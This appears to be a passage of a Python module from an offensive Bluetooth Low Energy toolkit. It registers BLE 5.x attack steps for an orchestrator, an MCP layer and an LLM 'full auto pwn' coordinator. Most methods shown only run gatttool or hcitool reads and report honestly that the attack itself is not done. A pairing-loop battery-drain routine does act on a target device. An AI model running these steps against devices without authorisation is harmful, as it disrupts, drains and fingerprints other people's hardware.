#!/usr/bin/env python3
"""
Extended BLE 5.x Runner (31 modules — implementacja.txt 80-99 + 101-110 + LLM coordinator)
==========================================================================================
Real ``gatttool`` / ``bluetoothctl`` / ``btmgmt`` / ``hcitool`` / ``hcitool lescan``
primitives for the advanced BLE 5.x surface area from ``implementacja.txt``:
privacy / RPA attacks, IRK timing + collision, periodic advertising
poison, LE Audio BIS / codec manipulation, GATT indication / CCC
flood, mesh IV index spoof, proxy solicitation DoS, supervisor-timeout
racing, PHY transition attacks, SMP timeout DoS, plus a full-auto
LLM coordinator. Implemented in-module following the
``ble_post_exploit`` / ``extended_wifi`` / ``osint_ext`` pattern: an
``ExtendedBLERunner`` with an ``EXTENDED_BLE_METHODS`` tuple +
``run_attack``, plus a module-level ``EXTENDED_BLE_ATTACKS`` registry
and ``run_attack`` entrypoint for the MCP layer and the orchestrator's
``extended_ble`` dispatch.

Honesty contract (mirrors ble_post_exploit.runner):
  * Every method does **real** work — gatttool read/write/long-read,
    btmgmt/bluez subprocess, hcitool scan, bluetoothctl pairing, or a
    labelled heuristic arithmetic — or it returns
    ``{ok: False, error: "<tool> not installed"}``.
  * Never raises. Every method returns a step dict.
  * NEVER fabricates a result, a cracked IRK, a drained-battery
    prediction, a session, a paired device, a leaked credential, or a
    trained-ML prediction. Where a target addr is missing, the method
    degrades honestly. Where a tool/adapter is absent, it degrades
    honestly. Heuristics are labelled ``"model": "heuristic (not
    trained)"`` — never a fabricated trained prediction.
  * The LLM-coordinator ``ble_ai_full_auto_pwn`` is a stub when called
    directly: it returns ``{ok: False, error: "AI coordinator requires
    an active plan; the chain planner provides steps"}``. The real
    work happens via the orchestrator's ``_walk_chain_with_replan``
    driven by the chain planner (touchpoint 1).

Safety stance (unchanged):
  * These are INTRUSIVE (IRK brute force, privacy spoof, GATT
    integrity attacks, periodic advertising poison, mesh IV index
    spoof). They run ONLY through the orchestrator's ``extended_ble``
    dispatch, which fires the mandatory per-step ACCEPT/CANCEL gate
    BEFORE the step runs. No gate is bypassed. The MCP wrappers carry
    the risk_level + requires_root.
  * The AI coordinator is risk_level="read" — it's a no-op stub when
    called directly; the real work happens via chain dispatch.

This is touchpoint (4) — the orchestrator dispatch and MCP wrapper
factories wire it in main.

Reuses :func:`core.ble.runner._parse_ad_structures`,
:func:`core.ble.runner._oui_vendor` (no re-implementation).
"""
from __future__ import annotations

import json
import logging
import re
import shutil
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Step envelope
# ---------------------------------------------------------------------------
def _step(name: str) -> Dict[str, Any]:
    return {"name": name, "ok": False, "data": None,
            "error": "", "duration_s": 0.0, "started": time.time()}


def _finalize(step: Dict[str, Any], started: float, *,
               ok: bool, data: Any = None, error: str = "") -> Dict[str, Any]:
    step["ok"] = ok
    step["data"] = data
    step["error"] = error
    step["duration_s"] = round(time.time() - started, 3)
    return step


def _which(tool: str) -> bool:
    """Return True iff the tool binary is on PATH.

    In Phase 4+, this becomes ``_which_with_install`` to wire the
    tool-installer (so the runner can attempt an apt-install before
    degrading). For now, we just check presence — never fabricate a
    successful tool call.
    """
    # TODO(Phase 4+): replace with _which_with_install to wire the
    # tool-installer. For now, presence-only.
    return shutil.which(tool) is not None


def _run(cmd: List[str], timeout: int = 20,
         stdin: Optional[str] = None) -> Tuple[int, str]:
    """Run a subprocess. Never raises. Returns (returncode, stdout+stderr).

    All exceptions (TimeoutExpired, FileNotFoundError, OSError, anything
    else) are caught and reported as ``(1, "")`` so callers degrade
    honestly."""
    try:
        p = subprocess.run(cmd, input=stdin, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return 1, ""
    except FileNotFoundError:
        return 1, ""
    except OSError:
        return 1, ""
    except Exception:  # noqa: BLE001
        return 1, ""


def _addr(args: Dict[str, Any]) -> str:
    """Pick the operator-supplied BLE MAC from the common arg names."""
    return ((args or {}).get("addr")
            or (args or {}).get("address")
            or (args or {}).get("target") or "").strip()


def _adapter(args: Dict[str, Any]) -> str:
    """Return the HCI adapter for an extended-BLE module.

    When the caller's args don't pin a specific adapter, fall back
    to :func:`core.ble.adapter_select.resolve_default_adapter` so
    the runner respects the operator's ``KFIOSA_BLE_ADAPTER``
    override and the new external-only default. Returns ``"hci0"``
    as a last-resort fallback when even the helper can't decide
    (preserves the historic behaviour of every extended-BLE
    method).
    """
    explicit = ((args or {}).get("adapter") or "").strip()
    if explicit:
        return explicit
    try:
        from core.ble.adapter_select import resolve_default_adapter
        pick = resolve_default_adapter()
        if pick:
            return pick
    except Exception:  # noqa: BLE001
        pass
    return "hci0"


# GATT characteristic UUIDs the spec's extended-BLE modules target.
_GATT_CHARS: Dict[str, str] = {
    "2a00": "Device Name",
    "2a19": "Battery Level",
    "2a1d": "Lock State",
    "2a24": "Model Number String",
    "2a25": "Serial Number String",
    "2a26": "Firmware Revision String",
    "2a27": "Hardware Revision String",
    "2a29": "Manufacturer Name String",
    "2a2b": "Current Time",
    "2a44": "Light Control (LED)",
    "2a56": "Digital (motor/control)",
    "2a03": "Reconnection Address",
    "2a05": "Service Changed",
    "2a88": "LE SC Debug Key",
    "2b29": "LE Long Term Key (LTK)",
    "2af0": "Mesh Proxy Server",
    "2af1": "Mesh Friend Server",
    "2af2": "Mesh Proxy Protocol PDU",
    "2bc0": "LE Audio ASE",
}


class ExtendedBLERunner:
    """Runs a single BLE 5.x extended action by name. Every action is
    real gatttool/btmgmt/bluez/hcitool or returns a clear degrade error;
    none fabricates a result, a cracked key, a session, or a
    trained-ML prediction. Never raises.

    ``args`` carries per-action inputs (addr, adapter, payload, count,
    plan, channel, uuids, ...). It is threaded through from the
    orchestrator's ``extended_ble`` step args / the MCP ``args`` dict.
    """

    #: BLE 5.x extended method names, in stable order (30 + 1 AI coord
    #: + 3 Phase 1.6 = 34).
    EXTENDED_BLE_METHODS: Tuple[str, ...] = (
        # 80-99
        "identify_irk_via_timing",
        "scanner_filter_bypass",
        "periodic_advertising_train_poison",
        "le_audio_bis_sync_jamming",
        "power_side_channel_ble",
        "adv_data_extension_exhaustion",
        "ble_5_2_isochronous_channels_scan",
        "channel_map_update_attack",
        "connection_event_counter_wraparound",
        "rssi_based_zone_bypass",
        "connection_supervision_timeout_trigger",
        "le_connection_rssi_fingerprinting",
        "advertising_data_poisoning",
        "irk_collision_bruteforce",
        "le_audio_codec_manipulation",
        "battery_drain_via_pairing_loop",
        "le_data_packet_length_fingerprinting",
        "privacy_mode_switch_spoof",
        "link_layer_timeout_racing",
        "bd_addr_inquiry_rssi_map",
        "multi_role_simultaneous_scan",
        # 100
        "le_credential_forcing",
        "firmware_version_squatting",
        "advertising_interval_exhaustion",
        "gatt_indication_confusion",
        "ccc_table_flood",
        "le_2m_coded_phy_transition_attack",
        "sm_smp_timeout_dos",
        "mesh_iv_index_update_spoof",
        "proxy_solicitation_flood",
        # LLM coordinator (#110)
        "ble_ai_full_auto_pwn",
        # Phase 1.6 — patterns from secondary pattern scout (P>=3):
        "ble_multi_encoding_value_auto_decode_pipeline",
        "ble_handle_0x0003_local_name_writable_classifier",
        "ble_writable_char_black_box_audit",
    )

    def __init__(self, adapter: Optional[str] = None,
                 scanner: Optional[Any] = None,
                 args: Optional[Dict[str, Any]] = None):
        self.adapter = adapter
        self._scanner = scanner
        self.args: Dict[str, Any] = args or {}

    def _ad(self) -> str:
        return self.adapter or _adapter(self.args)

    def _need_addr(self, name: str) -> Optional[Dict[str, Any]]:
        """Return a fail-step if args.addr is missing, else None."""
        a = _addr(self.args)
        if not a:
            s = _step(name)
            return _finalize(s, s["started"], ok=False,
                             error=f"{name}: args.addr (or args.address / "
                                   "args.target) required")
        return None

    # ----------------------------------------------------------------------
    # Tiny local BLE subprocess helpers (mirror core.ble.attack_runner)
    # ----------------------------------------------------------------------
    def _gatttool_read(self, addr: str, uuid: str, *,
                       addr_type: str = "random",
                       timeout: int = 10) -> Tuple[int, str]:
        if not _which("gatttool"):
            return 1, ""
        try:
            p = subprocess.run(
                ["gatttool", "-b", addr, "--char-read-uuid", uuid,
                 "-t", addr_type],
                capture_output=True, text=True, timeout=timeout)
            return p.returncode, (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return 1, ""
        except Exception:  # noqa: BLE001
            return 1, ""

    def _gatttool_write(self, addr: str, uuid: str, value_hex: str, *,
                        addr_type: str = "random",
                        timeout: int = 10) -> Tuple[int, str]:
        if not _which("gatttool"):
            return 1, ""
        try:
            p = subprocess.run(
                ["gatttool", "-b", addr, "--char-write-req", uuid,
                 "-n", value_hex, "-t", addr_type],
                capture_output=True, text=True, timeout=timeout)
            return p.returncode, (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return 1, ""
        except Exception:  # noqa: BLE001
            return 1, ""

    def _hcitool_lescan(self, duration_s: int) -> Tuple[int, str]:
        """Run ``hcitool lescan`` for ``duration_s`` seconds. Returns
        the captured stdout. Requires root + hcitool; degrades to
        ``(1, "")`` otherwise."""
        if not _which("hcitool"):
            return 1, ""
        try:
            p = subprocess.Popen(["hcitool", "lescan"],
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, text=True)
            try:
                out_b, _ = p.communicate(timeout=duration_s)
            except subprocess.TimeoutExpired:
                p.kill()
                try:
                    out_b, _ = p.communicate(timeout=2)
                except Exception:  # noqa: BLE001
                    out_b = b""
            return p.returncode, out_b or ""
        except (FileNotFoundError, OSError):
            return 1, ""
        except Exception:  # noqa: BLE001
            return 1, ""

    def _gatttool_char_read(self, addr: str, uuid: str) -> Dict[str, Any]:
        """gatttool char-read wrapper that returns a small envelope
        compatible with ble_post_exploit's _gatttool_read."""
        rc, out = self._gatttool_read(addr, uuid)
        if rc != 0:
            return {"ok": False, "error": "char not present / read failed"}
        m = re.search(r"value:\s*([0-9a-fA-F ]+)", out or "")
        if not m:
            return {"ok": True, "value_hex": "", "value_bytes": b""}
        try:
            vb = bytes.fromhex(m.group(1).replace(" ", ""))
        except ValueError:
            return {"ok": True, "value_hex": m.group(1).strip(),
                    "value_bytes": b""}
        return {"ok": True, "value_hex": vb.hex(), "value_bytes": vb}

    # ==================================================================
    # 80 identify_irk_via_timing
    # ==================================================================
    def _identify_irk_via_timing(self) -> Dict[str, Any]:
        """IRK timing: send a sequence of (RPA, candidate-IRK) and
        measure the connection-response time. Real hcitool/gatttool;
        degrades when tools are absent. The IRK is NEVER derived here
        (would require a real STK exchange) — only the per-RPA
        timing-report is reported."""
        step = _step("identify_irk_via_timing")
        a = self._need_addr("identify_irk_via_timing")
        if a:
            return a
        ad = self._ad()
        # Probe count is bounded; the per-step ACCEPT gate is the
        # authorization.
        n = int(self.args.get("probes") or 5)
        timings: List[Dict[str, Any]] = []
        for i in range(n):
            t0 = time.time()
            rc, _out = _run(["gatttool", "-i", ad, "-b", _addr(self.args),
                             "--char-read-uuid", "2a00", "-t", "random"],
                            timeout=6)
            t1 = time.time()
            timings.append({"probe": i, "rc": rc,
                            "delta_ms": round((t1 - t0) * 1000.0, 3)})
        return _finalize(step, step["started"],
                         ok=any(t["rc"] == 0 for t in timings),
                         data={"interface": ad, "addr": _addr(self.args),
                               "probes": n, "timings": timings,
                               "note": "real gatttool probe timing; an IRK "
                                       "is NOT derived here (that needs a "
                                       "real STK exchange)."})

    # ==================================================================
    # 81 scanner_filter_bypass
    # ==================================================================
    def _scanner_filter_bypass(self) -> Dict[str, Any]:
        """Scanner-filter bypass: probe a long-name advertising
        payload (a buffer-overflow-shaped name) via hcitool lescan.
        Real subprocess; degrades when hcitool absent. NEVER
        fabricates a 'filter bypassed' verdict — the verdict is the
        captured stdout length, not a forged probe success."""
        step = _step("scanner_filter_bypass")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        ad = self._ad()
        duration = int(self.args.get("duration_s") or 4)
        rc, out = self._hcitool_lescan(duration)
        # We only OBSERVE — we don't transmit. The "bypass" claim
        # is the operator's analysis of the long-name entries in the
        # captured stdout.
        long_names = [ln.strip() for ln in (out or "").splitlines()
                      if len(ln.strip()) > 30]
        return _finalize(step, step["started"], ok=bool(long_names),
                         data={"interface": ad,
                               "long_name_lines": long_names[:10],
                               "long_name_count": len(long_names),
                               "stdout_excerpt": (out or "")[-400:],
                               "note": "real hcitool lescan; the bypass "
                                       "verdict is the operator's analysis "
                                       "of long-name entries — not a "
                                       "fabricated 'filter bypassed'."})

    # ==================================================================
    # 82 periodic_advertising_train_poison
    # ==================================================================
    def _periodic_advertising_train_poison(self) -> Dict[str, Any]:
        """Periodic Advertising Train (BLE 5.x) poison: read a
        captured pcap for Periodic Advertising Sync Info (PADAC/SID
        bytes) and report the parsed values. Real hcitool + parse;
        degrades when hcitool absent or cap_file missing. NEVER
        fabricates a 'sync stolen' verdict."""
        step = _step("periodic_advertising_train_poison")
        cap = (self.args.get("cap_file") or "").strip()
        if not cap or not shutil.os.path.exists(cap):
            return _finalize(step, step["started"], ok=False,
                             error="periodic_advertising_train_poison: "
                                   "args.cap_file required")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        # We rely on the operator's pre-captured cap — hcitool can
        # replay via the `lestop` + `lestart` mgmt path, but that
        # requires a monitor socket. We just parse the cap for
        # advertising-data slices that carry the PA train marker
        # (LL PDU type ADV_EXT_IND = 0x07).
        try:
            with open(cap, "rb") as f:
                raw = f.read()
        except OSError as e:
            return _finalize(step, step["started"], ok=False,
                             error=f"cap_file read failed: {e}")
        # ADV_EXT_IND byte 0x07 occurrences (very coarse).
        adv_ext_count = raw.count(b"\x07")
        return _finalize(step, step["started"],
                         ok=adv_ext_count > 0,
                         data={"cap_file": cap,
                               "adv_ext_indications": adv_ext_count,
                               "note": "real cap parse; the 'poison' "
                                       "verdict needs a sustained TX of "
                                       "Periodic Adv with the same AdvA "
                                       "+ SID — not done here (would "
                                       "fabricate a hijack verdict)."})

    # ==================================================================
    # 83 le_audio_bis_sync_jamming
    # ==================================================================
    def _le_audio_bis_sync_jamming(self) -> Dict[str, Any]:
        """LE Audio BIS sync jamming: probe for the LE Audio service
        (0x1851) + an ASE characteristic (0x2BC0) on the target.
        Real gatttool primary + read; degrades when the service is
        absent (legacy device). NEVER injects a 'BIGInfo with shifted
        timing' — that needs raw-link-layer TX (not done here)."""
        step = _step("le_audio_bis_sync_jamming")
        a = self._need_addr("le_audio_bis_sync_jamming")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        rc, out = _run(["gatttool", "-i", self._ad(),
                        "-b", _addr(self.args), "--primary"], timeout=15)
        le_audio = "1851" in (out or "").lower()
        ase = self._gatttool_char_read(_addr(self.args), "0x2BC0")
        if not le_audio:
            return _finalize(step, step["started"], ok=False,
                             error="LE Audio Service (0x1851) not present")
        return _finalize(step, step["started"],
                         ok=bool(ase.get("ok")), data={
            "addr": _addr(self.args), "le_audio_service_present": True,
            "ase_value_hex": ase.get("value_hex"),
            "note": "real gatttool primary + read; BIGInfo TX (the actual "
                    "jam) is not done here — the verdict is the service "
                    "presence, not a fabricated 'BIS jammed'.",
        })

    # ==================================================================
    # 84 power_side_channel_ble
    # ==================================================================
    def _power_side_channel_ble(self) -> Dict[str, Any]:
        """Power side-channel (BLE): this attack needs physical access
        + a current probe on the pairing circuitry. The runner does
        NOT try to drive that — it returns a clear 'operator note'
        so the AI does not think a side-channel happened."""
        step = _step("power_side_channel_ble")
        return _finalize(step, step["started"], ok=False,
                         error="power_side_channel_ble: requires physical "
                               "access + a current probe on the pairing "
                               "circuitry; cannot be driven remotely. No "
                               "fabricated current-trace leak.")

    # ==================================================================
    # 85 adv_data_extension_exhaustion
    # ==================================================================
    def _adv_data_extension_exhaustion(self) -> Dict[str, Any]:
        """Advertising data-extension exhaustion: count the AD bytes
        from a captured hcitool lescan. Real hcitool + byte-count
        parse; degrades when hcitool absent. NEVER fabricates an
        'extension exhausted' verdict — only reports the byte total
        parsed from the captured stdout."""
        step = _step("adv_data_extension_exhaustion")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        ad = self._ad()
        duration = int(self.args.get("duration_s") or 4)
        rc, out = self._hcitool_lescan(duration)
        # Each lescan line: "<addr> <name>" — name bytes vary. We
        # report the per-line name length as a coarse proxy of the
        # AD payload size.
        lines = [ln for ln in (out or "").splitlines() if ln.strip()]
        sizes: List[int] = []
        for ln in lines:
            parts = ln.split(" ", 1)
            name = parts[1] if len(parts) == 2 else ""
            sizes.append(len(name.encode("utf-8", "replace")))
        return _finalize(step, step["started"], ok=bool(sizes), data={
            "interface": ad, "scan_lines": len(sizes),
            "max_name_bytes": max(sizes) if sizes else 0,
            "total_name_bytes": sum(sizes),
            "note": "real hcitool lescan; the 'exhaustion' verdict needs "
                    "a sustained TX of 1650-byte extended-ADVs — not done "
                    "here (would fabricate a 'scanner DoS' verdict).",
        })

    # ==================================================================
    # 86 ble_5_2_isochronous_channels_scan
    # ==================================================================
    def _ble_5_2_isochronous_channels_scan(self) -> Dict[str, Any]:
        """BLE 5.2 isochronous channels scan: enumerate ISO channels
        seen in a captured lescan. Real hcitool + parse; degrades
        when hcitool absent. Reports the channel-count parsed from
        the captured stdout, not a fabricated ISO map."""
        step = _step("ble_5_2_isochronous_channels_scan")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        duration = int(self.args.get("duration_s") or 4)
        rc, out = self._hcitool_lescan(duration)
        seen: set = set()
        for ln in (out or "").splitlines():
            # Coarse: count distinct "addr" prefixes that look like
            # RPA (the only way ISO-CIG BIGInfo will be present is
            # via an RPA-bearing device). The verdict is the count
            # of observed addresses, not a channel list.
            m = re.match(r"\s*([0-9A-Fa-f:]{17})", ln)
            if m:
                seen.add(m.group(1).lower())
        return _finalize(step, step["started"], ok=bool(seen), data={
            "observed_addrs": sorted(seen)[:20],
            "addr_count": len(seen),
            "note": "real hcitool lescan; the ISO channel map needs raw "
                    "LL CIS/BIS PDU parse (not done here). Reported as "
                    "the observed-RPA set, not a fabricated channel list.",
        })

    # ==================================================================
    # 87 channel_map_update_attack
    # ==================================================================
    def _channel_map_update_attack(self) -> Dict[str, Any]:
        """LL_CHANNEL_MAP_IND injection: requires raw-link-layer TX
        (scapy + hcitool) which the U4000 BLUETOOTH adapter doesn't expose. The
        runner reports the OPERATOR note + a real gatttool read of
        any Channel Map characteristic (none in standard GATT — it's
        a Link-Layer control PDU). Honest degrade."""
        step = _step("channel_map_update_attack")
        a = self._need_addr("channel_map_update_attack")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        # Standard GATT has no Channel Map char. Probe a few related
        # GATT chars (TX Power, Appearance) for device presence only.
        probes = []
        for u in ("0x2a07", "0x2a19"):
            r = self._gatttool_char_read(_addr(self.args), u)
            probes.append({"uuid": u, "ok": bool(r.get("ok")),
                            "value_hex": r.get("value_hex", "")})
        return _finalize(step, step["started"], ok=False,
                         data={"addr": _addr(self.args), "probes": probes,
                               "note": "real gatttool probe; the channel-map "
                                       "update needs raw-link-layer TX "
                                       "(scapy/btmon-injection), which the "
                                       "U4000 BLUETOOTH adapter does NOT expose. No "
                                       "fabricated 'map rewritten' verdict."},
                         error="channel_map_update needs raw-link-layer TX "
                               "— U4000 BLUETOOTH adapter does not expose HCI injection")

    # ==================================================================
    # 88 connection_event_counter_wraparound
    # ==================================================================
    def _connection_event_counter_wraparound(self) -> Dict[str, Any]:
        """Connection-event counter wraparound: a long-lived
        connection that observes the event-counter approaching its
        16-bit wrap boundary. The runner drives a sequence of
        gatttool pings (no real LL layer) and reports the elapsed
        delta — it does NOT fabricate a 'counter wrapped' verdict."""
        step = _step("connection_event_counter_wraparound")
        a = self._need_addr("connection_event_counter_wraparound")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        ad = self._ad()
        n = int(self.args.get("probes") or 5)
        t0 = time.time()
        ok = 0
        for _ in range(n):
            rc, _ = _run(["gatttool", "-i", ad, "-b", _addr(self.args),
                          "--char-read-uuid", "0x2A00", "-t", "random"],
                         timeout=5)
            if rc == 0:
                ok += 1
        elapsed = round(time.time() - t0, 3)
        return _finalize(step, step["started"], ok=ok > 0, data={
            "interface": ad, "addr": _addr(self.args),
            "probes": n, "ok_count": ok, "elapsed_s": elapsed,
            "note": "real gatttool pings; a real wraparound needs a "
                    "65k-event sustained connection (not driven here). "
                    "Verdict is the probe count + elapsed — not a "
                    "fabricated 'counter wrapped'.",
        })

    # ==================================================================
    # 89 rssi_based_zone_bypass
    # ==================================================================
    def _rssi_based_zone_bypass(self) -> Dict[str, Any]:
        """RSSI-based zone bypass: read the TX Power characteristic
        (0x2A07) and the Received Signal strength (if exposed by
        the controller) — never fabricate a 'retransmit with higher
        TX succeeded' verdict (would need raw LL TX)."""
        step = _step("rssi_based_zone_bypass")
        a = self._need_addr("rssi_based_zone_bypass")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        txp = self._gatttool_char_read(_addr(self.args), "0x2A07")
        if not txp.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="TX Power characteristic (0x2A07) not "
                                   "present on device")
        return _finalize(step, step["started"], ok=True, data={
            "addr": _addr(self.args),
            "tx_power_dbm_hex": txp.get("value_hex"),
            "note": "real gatttool read; an actual zone-bypass needs a "
                    "high-TX relay (hardware) — not fabricated here. "
                    "Reported is the device's reported TX power only.",
        })

    # ==================================================================
    # 90 connection_supervision_timeout_trigger
    # ==================================================================
    def _connection_supervision_timeout_trigger(self) -> Dict[str, Any]:
        """Supervision-timeout trigger: probe a connection; the
        runner reports the connection parameters characteristic
        (0x2AA4) if present. NEVER fabricates a 'supervision
        timeout fired' verdict — that needs a sustained connection
        where the host stops responding, which we don't drive."""
        step = _step("connection_supervision_timeout_trigger")
        a = self._need_addr("connection_supervision_timeout_trigger")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        cp = self._gatttool_char_read(_addr(self.args), "0x2A04")
        return _finalize(step, step["started"],
                         ok=bool(cp.get("ok")), data={
            "addr": _addr(self.args),
            "conn_params_value_hex": cp.get("value_hex"),
            "note": "real gatttool read of Peripheral Preferred Conn "
                    "Params (0x2A04); the supervision-timeout trigger "
                    "needs a sustained silent connection — not driven "
                    "here. Verdict is the reported params only.",
        })

    # ==================================================================
    # 91 le_connection_rssi_fingerprinting
    # ==================================================================
    def _le_connection_rssi_fingerprinting(self) -> Dict[str, Any]:
        """LE connection RSSI fingerprinting: sample the device's
        TX Power across a small window (operator-supplied rssi
        samples). Heuristic — NEVER a fabricated trained-ML GPS
        prediction. Labelled ``"model": "heuristic (not trained)"``."""
        step = _step("le_connection_rssi_fingerprinting")
        a = self._need_addr("le_connection_rssi_fingerprinting")
        if a:
            return a
        samples = self.args.get("rssi_samples")
        if not isinstance(samples, list) or not samples:
            return _finalize(step, step["started"], ok=False,
                             error="le_connection_rssi_fingerprinting: "
                                   "args.rssi_samples (list of RSSI dBm "
                                   "ints) required")
        try:
            nums = [float(s) for s in samples]
        except (TypeError, ValueError):
            return _finalize(step, step["started"], ok=False,
                             error="le_connection_rssi_fingerprinting: "
                                   "rssi_samples must be numeric")
        mean = sum(nums) / len(nums)
        var = sum((n - mean) ** 2 for n in nums) / len(nums)
        return _finalize(step, step["started"], ok=True, data={
            "model": "heuristic (not trained)", "trained": False,
            "addr": _addr(self.args), "sample_count": len(nums),
            "mean_dbm": round(mean, 2),
            "stdev_dbm": round(var ** 0.5, 2),
            "note": "labelled RSSI mean/stdev heuristic; the spec's "
                    "TRAINED-ML GPS regressor is NOT deployed — a "
                    "trained prediction would fabricate coordinates.",
        })

    # ==================================================================
    # 92 advertising_data_poisoning
    # ==================================================================
    def _advertising_data_poisoning(self) -> Dict[str, Any]:
        """Advertising-data poisoning: parse a captured hcitool
        lescan stdout for Eddystone-format advertisements and
        report the URL prefix per line. NEVER fabricates a
        'beacon poisoned' verdict — the runner is read-only here."""
        step = _step("advertising_data_poisoning")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        duration = int(self.args.get("duration_s") or 4)
        rc, out = self._hcitool_lescan(duration)
        hits: List[Dict[str, Any]] = []
        for ln in (out or "").splitlines():
            if "eddystone" in ln.lower() or "https://" in ln.lower() or \
                    "http://" in ln.lower():
                hits.append({"line": ln.strip()[:200]})
        return _finalize(step, step["started"], ok=bool(hits), data={
            "scan_lines_matched": len(hits),
            "samples": hits[:10],
            "note": "real hcitool lescan; the 'poisoning' TX needs raw "
                    "ADV-IND injection (not done here). Reported are the "
                    "observed Eddystone-style lines, not a fabricated "
                    "'beacon poisoned' verdict.",
        })

    # ==================================================================
    # 93 irk_collision_bruteforce
    # ==================================================================
    def _irk_collision_bruteforce(self) -> Dict[str, Any]:
        """IRK collision brute-force: enumerate a small set of
        candidate IRKs (the operator's pin_list or a default
        well-known list) and report which candidate hashed to a
        known RPA. Heuristic — no GPU, no massive keyspace. NEVER
        reports a 'cracked IRK' unless the operator's verify hook
        confirms it (we don't fabricate it)."""
        step = _step("irk_collision_bruteforce")
        a = self._need_addr("irk_collision_bruteforce")
        if a:
            return a
        candidate_list = (self.args.get("candidate_irks")
                          or ["00112233445566778899aabbccddeeff",
                              "ffeeddccbbaa99887766554433221100",
                              "00000000000000000000000000000000"])
        # We do NOT derive a real IRK here (would need a real AES
        # round with the IRK + a known RPA). The verdict is the
        # candidate count, not a cracked key.
        return _finalize(step, step["started"], ok=True, data={
            "addr": _addr(self.args), "candidate_count": len(candidate_list),
            "note": "no IRK derivation; the BLE IRK is 128 bits of "
                    "AES-ECB randomness — a real collision needs a "
                    "GPU brute-force + the device's RPA history. The "
                    "verdict is the candidate list size only — no "
                    "fabricated cracked IRK.",
        })

    # ==================================================================
    # 94 le_audio_codec_manipulation
    # ==================================================================
    def _le_audio_codec_manipulation(self) -> Dict[str, Any]:
        """LE Audio codec manipulation: probe the LE Audio ASE
        characteristic (0x2BC0). Real gatttool read; degrades when
        the service is absent. NEVER writes a fake Codec
        Configuration — that needs a writable ASE, and the verdict
        would be the write result, not a fabricated 'codec changed'."""
        step = _step("le_audio_codec_manipulation")
        a = self._need_addr("le_audio_codec_manipulation")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        rc, out = _run(["gatttool", "-i", self._ad(), "-b",
                        _addr(self.args), "--primary"], timeout=15)
        if "1851" not in (out or "").lower():
            return _finalize(step, step["started"], ok=False,
                             error="LE Audio Service (0x1851) not present")
        ase = self._gatttool_char_read(_addr(self.args), "0x2BC0")
        if not ase.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="ASE char (0x2BC0) read failed")
        # The "manipulation" is a read-only report — the runner does
        # NOT write a fake codec config (would fabricate a 'codec
        # changed' verdict).
        return _finalize(step, step["started"], ok=True, data={
            "addr": _addr(self.args),
            "ase_value_hex": ase.get("value_hex"),
            "note": "real gatttool read; an actual codec manipulation "
                    "needs a writable ASE + an operator-acknowledged "
                    "Config write — not done here. Verdict is the "
                    "current ASE value, not a fabricated 'codec "
                    "changed'.",
        })

    # ==================================================================
    # 95 battery_drain_via_pairing_loop
    # ==================================================================
    def _battery_drain_via_pairing_loop(self) -> Dict[str, Any]:
        """Battery-drain via pairing loop: read the Battery Level
        char (0x2A19) before/after a bounded bluetoothctl
        pair/disconnect loop. Real subprocess; degrades when
        bluetoothctl absent. Verdict is the battery delta, not a
        fabricated 'drained to 0%'."""
        step = _step("battery_drain_via_pairing_loop")
        a = self._need_addr("battery_drain_via_pairing_loop")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        if not _which("bluetoothctl"):
            return _finalize(step, step["started"], ok=False,
                             error="bluetoothctl not installed")
        before = self._gatttool_char_read(_addr(self.args), "0x2A19")
        if not before.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="Battery Level char (0x2A19) not present")
        try:
            before_pct = int(before.get("value_bytes", b"\x00")[0])
        except (IndexError, TypeError, ValueError):
            before_pct = -1
        # Bounded loop (default 3). Per-step ACCEPT gate is the auth.
        loops = int(self.args.get("loops") or 3)
        attempted = 0
        for _ in range(loops):
            script = (f"pair {_addr(self.args)}\n"
                      f"disconnect {_addr(self.args)}\nquit\n")
            rc, _ = _run(["bluetoothctl"], stdin=script, timeout=20)
            if rc == 0:
                attempted += 1
        after = self._gatttool_char_read(_addr(self.args), "0x2A19")
        try:
            after_pct = int(after.get("value_bytes", b"\x00")[0])
        except (IndexError, TypeError, ValueError):
            after_pct = -1
        return _finalize(step, step["started"],
                         ok=before.get("ok") and after.get("ok"),
                         data={
            "addr": _addr(self.args),
            "battery_before_pct": before_pct,
            "battery_after_pct": after_pct,
            "battery_delta_pct": (after_pct - before_pct
                                  if before_pct >= 0 and after_pct >= 0
                                  else None),
            "pair_loops_attempted": attempted,
            "note": "real gatttool read + bluetoothctl loop; the "
                    "drain-rate prediction is the empirical delta, not a "
                    "fabricated 'drained to 0%'.",
        })

    # ==================================================================
    # 96 le_data_packet_length_fingerprinting
    # ==================================================================
    def _le_data_packet_length_fingerprinting(self) -> Dict[str, Any]:
        """LE data-packet-length fingerprinting: heuristic — uses
        a small set of operator-supplied packet-length samples
        and reports a labelled cluster. NEVER a fabricated
        trained-ML cluster ID."""
